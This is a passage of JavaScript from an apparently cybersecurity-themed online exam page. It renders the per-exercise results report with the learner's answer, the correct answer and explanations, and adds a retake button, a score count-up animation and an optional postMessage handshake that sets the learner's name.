    h.innerHTML='<span class="stchip '+chip+'">'+lbl+'</span><h5>'+esc(ex.id+' — '+(ex.title||ex.question.slice(0,60)))+'</h5><span class="dim">'+esc(ex.theme)+'</span><span class="dim">'+(r.status&&r.status!=='skipped'&&r.status!==null?(r.awarded+'/10 pts'):'0 pts')+'</span>';
    it.appendChild(h);
    var b=el('div','rep-b');
    if(r.status==='correct'||r.status==='partial'||r.status==='wrong'){
      b.innerHTML='<div><b>Your answer:</b> '+(r.answerSummary||'—')+'</div>'+
        '<div style="margin-top:6px"><b>Correct answer:</b> '+(S.widgets[ex.id]?S.widgets[ex.id].summary():'')+'</div>'+
        '<div style="margin-top:6px"><b>Why:</b> '+ptext(ex.explain)+'</div>'+
        (r.status!=='correct'?'<div style="margin-top:6px"><b>What to study:</b> '+esc(ex.study)+'</div>':'')+
        (ex.perspNote?'<div style="margin-top:6px"><b>Two-sided view:</b> '+ptext(ex.perspNote)+'</div>':'');
    } else {
      b.innerHTML='<div class="dim">You skipped this exercise and never answered it. The answer is hidden so the exam stays reusable for a retake. The underlying concept is covered in the explanation of its twin exercises in this tier and the other tiers.</div>';
    }
    it.appendChild(b);
    rep.appendChild(it);
  });
  sc.appendChild(rep);
  var btns=el('div','btnrow');btns.style.justifyContent='center';btns.style.margin='16px 0';
  var rt=el('button','mainbtn','\u21BB Retake exam');
  rt.addEventListener('click',function(){S.retook=true;S.retakeArmed=true;renderIntro();});
  btns.appendChild(rt);
  sc.appendChild(btns);
  st.appendChild(sc);
  renderHeader();
  window.scrollTo(0,0);
  /* score count-up, then report once */
  if(reducedMotion()){
    big.textContent=R.pct+'%';
    if(!S.reported){S.reported=true;reportScore(R.score,R.total);}
  } else {
    var cur=0,steps=Math.max(1,R.pct),inc=Math.max(1,Math.ceil(R.pct/40));
    var iv=setInterval(function(){
      cur=Math.min(R.pct,cur+inc);
      big.textContent=cur+'%';
      if(cur>=R.pct){
        clearInterval(iv);
        if(!S.reported){S.reported=true;reportScore(R.score,R.total);}
      }
    },28);
  }
}

/* ---------- site handshake (optional) ---------- */
window.addEventListener('message',function(event){
  if(!event.data)return;
  if(event.data.type!=='CYBERPULSE_INIT'&&event.data.type!=='CYBERMASTERY_INIT')return;
  try{
    if(event.data.username)S.learner=String(event.data.username).slice(0,60);
  }catch(e){}
  if(S.phase==='intro')renderIntro();
});

/* ---------- boot ---------- */
renderIntro();

</script>
